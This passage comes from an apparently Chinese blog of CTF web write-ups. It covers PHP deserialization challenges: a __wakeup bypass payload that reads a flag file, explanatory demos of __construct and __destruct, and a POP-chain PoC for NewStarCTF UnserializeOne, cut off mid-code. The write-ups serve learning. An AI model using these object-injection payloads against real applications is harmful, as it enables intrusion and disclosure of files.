<p>先说下我当时的想法，就是一看到__wakeup()，八成是要绕过它的，然后危险函数是highlight_file()，只需要把里面的变量换为flag的绝对路径，然后将序列化后的字符中路径修改为靶机flag文件的绝对路径，接着再修改成员数（必须大于当前真实的成员数目），提交参数就可以了。</p>
<p>编写poc，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">X</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span> = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">X</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>运行结果为，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:37:&quot;D:\桌面\工具\php\teacher.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>百度搜下linux的www文件目录一般是什么，</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/2.png"></p>
<p>那么把目录修改下，最终的payload为，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:27:&quot;/var/www/html/fllllllag.php&quot;;&#125;</span><br><span class="line">//注意目录改变后，需要将目录的长度修改为当前实际长度27（原来是37）</span><br><span class="line">//因为要绕过__wakeup()，需要将成员数1修改为2（任何大于1的都可以）</span><br></pre></td></tr></table></figure>

<p>提交成功，flag浮现，</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/3.png"></p>
<hr>
<hr>
<p>​              <em><strong>写一个题目的目的不仅仅是找到正确flag得分，更重要的是从这个题目中学到了些什么知识</strong></em></p>
<p>这个题目我只是依靠经验做出来了，但是如果让我具体分析</p>
<p>1，为什么要绕过<code>__wakeup()</code>，不绕过为什么不行？</p>
<p>2，为什么提交payload后不是显示的是<code>x = __FILE__;</code>的源码？触发__construct()函数不是会将$x赋值为当前文件件绝对路径吗？我说不出来……</p>
<hr>
<hr>
<p>所以在提交完正确的flag后，我也是想到了刚才说的两个问题，于是乎再研究了一下，现在回答下这两个问题。</p>
<p>先了解一下反序列化具体过程，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>() 对单一的已序列化的变量进行操作，将其转换回 php 的值。在解序列化一个对象前，这个对象的类必须在解序列化之前定义。 </span><br><span class="line">简单来理解起来就算将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程，恢复到变量序列化之前的结果。</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">file_get_contents</span>(‘./目标文本文件<span class="string">&#x27;); //取得文本文件的内容（之前序列化过的字符串）</span></span><br><span class="line"><span class="string">$变量 = unserialize($s); //将该文本内容，反序列化到指定的变量中</span></span><br></pre></td></tr></table></figure>

<p>通过一个例子来了解反序列化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;user &#x27;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="variable language_">$this</span>-&gt;age.<span class="string">&#x27; years old. &lt;br /&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重建对象</span></span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;user&quot;:2:&#123;s:3:&quot;age&quot;;i:10;s:4:&quot;name&quot;;s:4:&quot;tome&quot;;&#125;&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">printdata</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过源码知道，虽然没有创建类user的对象，但是反序列化之后，可以直接调用$user中的printdata()方法。那么问题来了，unserialize()函数返回的是个什么东东，为什么可以当对象使用？</p>
<p>在本地测试一下，</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/6.png"></p>
<p>发现unserialize()函数返回值是类user的一个实例对象，其中对象里变量$age，$name的值是序列化字符串里对应的，10，tome。</p>
<p><strong>简单说，不管类中变量值是什么，构造的序列化字符串里变量的值是什么，反序列化后创建的该类对象里的变量值就是什么。</strong></p>
<p>上述代码运行结果如下，</p>
<p><img src="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/5.png"></p>
<p>验证了上述猜测。</p>
<p>我还有个疑问，就是<code>__construct()，__destruct()</code>这两个函数什么情况下被触发？以前都是看的比较专业的语言说明的，也没看太懂。</p>
<p>通过下面例子可以更明白两个函数被触发的情况，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;000\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;111\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;222\n&quot;</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$class</span>);</span><br></pre></td></tr></table></figure>

<p>输出，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()!!!000</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">__destruct()!!!__destruct()!!!</span><br></pre></td></tr></table></figure>

<p>去掉unset()函数，再试下没有该函数，会不会触发<code>__destruct()</code>函数？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;000\n&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;111\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;222\n&quot;</span>;</span><br><span class="line"><span class="comment">//unset($class);</span></span><br></pre></td></tr></table></figure>

<p>输出结果，还是一样的，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct()!!!000</span><br><span class="line">111</span><br><span class="line">222</span><br><span class="line">__destruct()!!!__destruct()!!!</span><br></pre></td></tr></table></figure>



<p>（1）<strong>说明<code>__construct()</code>会在创建对象的时候(<code>$class = new TestClass();</code>)被触发，但是反序列化时<code>$b = unserialize($a);</code>，不会被触发。</strong></p>
<p>为什么反序列化返回了一个对象，但是不会触发<code>__construct()</code>呢？下面是我的一些理解，有不正确的地方请各位大佬批评指正，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">虽然有对象被创建，但是因为unserialize函数不一定返回的是对象，可返回 integer、float、string、array 或 object。</span><br><span class="line">如果反序列化返回的不是一个对象，那么__construct()就不会被触发， 而integer、float、string、array这些数据类型应该是一样的。</span><br><span class="line">所以反序列化返回的是一个对象时，也不会触发__construct()。</span><br><span class="line">因此可以理解为什么反序列化对象字符为对象的时候，虽然有对象被创建，甚至可以调用返回对象中的函数，但是并不会触发__construct()函数</span><br></pre></td></tr></table></figure>



<p>（2）<strong>说明<code>__destruct()</code>会在代码执行完成后被触发一次，因为在php中，程序在运行结束后，会自动的销毁对象！这时会触发destruct()函数。反序列化完成时会触发一次(我理解的是销毁对象)，所以才输出两个<code>__destruct()!!!</code>。</strong></p>
<p>反序列化完成时会触发<code>__destruct()</code>函数一次(我理解的是销毁对象)，这个怎么理解呢，直接上代码说明，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="comment">//$b = unserialize($a);</span></span><br><span class="line"><span class="comment">//没有反序列化的情况下，输出__destruct()!!!</span></span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct()!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title class_">TestClass</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//有反序列的情况下，输出__destruct()!!!__destruct()!!!</span></span><br></pre></td></tr></table></figure>



<hr>
<hr>
<p>最后总的来梳理一下题目反序列化时的过程，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1，运行poc，输入序列化后的字符串  O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:37:&quot;D:\桌面\工具\php\teacher.php&quot;;&#125;</span><br><span class="line">修改fllllllag.php文件路径为  /var/www/html/fllllllag.php ，并修改相应字符长度值为27。</span><br><span class="line">提交后，在执行unserialize()函数之前，先检查类里是否有__wakeup()函数，本题中有，就会先执行该函数，</span><br><span class="line">然后会把$x的值赋值为当前文件的绝对路径，我们想要的是fllllllag.php文件，于是需要绕过__wakeup()函数。</span><br><span class="line"></span><br><span class="line">2，开始执行unserialize()函数，由于靶机源码中没有$class = new TestClass()这样的创建实体对象代码，所以这时不会触发__construct()函数（不理解的话，可以看文章前面的分析）</span><br><span class="line"></span><br><span class="line">3，反序列化后，将传入的序列化字符串中的变量$x的值 /var/www/html/fllllllag.php 赋值给X类中的$x，</span><br><span class="line"></span><br><span class="line">4，程序执行完毕，触发 __destruct()函数，并显示路径为$x的文件内容。</span><br></pre></td></tr></table></figure>

<p>—————————————————————————–<strong>END</strong>——————————————————————————————————-</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/" data-id="cl9hxo4hl001420v4h2vj4vfn" data-title="由NSSCTF-SWPUCTF-ez_ez_unserialize，引发对反序列具体详细过程以及对__construct，__destruct函数执行情况深度分析" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NSWSTAR-week2-UnserializeOne" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/" class="article-date">
  <time class="dt-published" datetime="2022-10-19T10:59:22.000Z" itemprop="datePublished">2022-10-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/19/NSWSTAR-week2-UnserializeOne/">NSWSTAR-week2-UnserializeOne</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>写这个反序列化题目，学到了几点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1，__clone()魔法函数的触发方法以及一些细节</span><br><span class="line">2，反序列化中属性的私有以及保护的处理方法</span><br></pre></td></tr></table></figure>

<p>直接看题目，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一波，确定了基本pop链，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start:__destruct==&gt;Sec::__toString==&gt;Easy::__call==&gt;eeee::__clone==&gt;Start::__isset==&gt;Sec::__invoke</span><br></pre></td></tr></table></figure>

<p>更详细的pop链，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Start::__destruct()@$this-&gt;name=$sec   -&gt;   $Sec::__toString()@$this-&gt;obj=$easy   -&gt;   $Easy::__call()@$this-&gt;cla=$copy_eee&amp;$var[0]=$eee   -&gt;   $eee::__clone()@($this-&gt;obj)=($start)   -&gt;   $Start::__isset()@$this-&gt;func=$sec   -&gt;   sec::__invoke()</span><br></pre></td></tr></table></figure>

<p>接下来编写poc，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>=<span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$sec</span>=<span class="keyword">new</span> <span class="title class_">Sec</span>();</span><br><span class="line"><span class="variable">$easy</span>=<span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br><span class="line"><span class="variable">$ee</span>=<span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span>-&gt;func=<span class="variable">$sec</span>;</span><br><span class="line"><span class="variable">$ee</span>-&gt;obj=<span class="variable">$start</span>;</span><br><span class="line"><span class="variable">$easy</span>-&gt;cla=<span class="variable">$copy_ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;<span class="keyword">var</span>[<span class="number">0</span>]=<span class="variable">$ee</span>;</span><br><span class="line"><span class="variable">$sec</span>-&gt;obj=<span class="variable">$easy</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;name=<span class="variable">$sec</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>)));</span><br></pre></td></tr></table></figure>

<p>运行，发现php报错，</p>
<p><img src="/2022/10/19/NSWSTAR-week2-UnserializeOne/0.png"></p>
<p>然后搞了好久也没找到解决方法，又检查了好几遍pop链，感觉pop链没错，一时间不知道怎么做了。</p>
<p>直到writeup出来😶😶……</p>
<p>最后看了一下writeup，发现构造的pop链是正确的，只是构造过程中几个细节没有处理好，导致php出错。</p>
<p>重新编写的poc，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$func</span>;<span class="comment">//protected变为public，具体为什么这样修改，现在还不太清楚</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$obj</span>;<span class="comment">// private变为public</span></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$var</span>;<span class="comment">// private变为public</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span 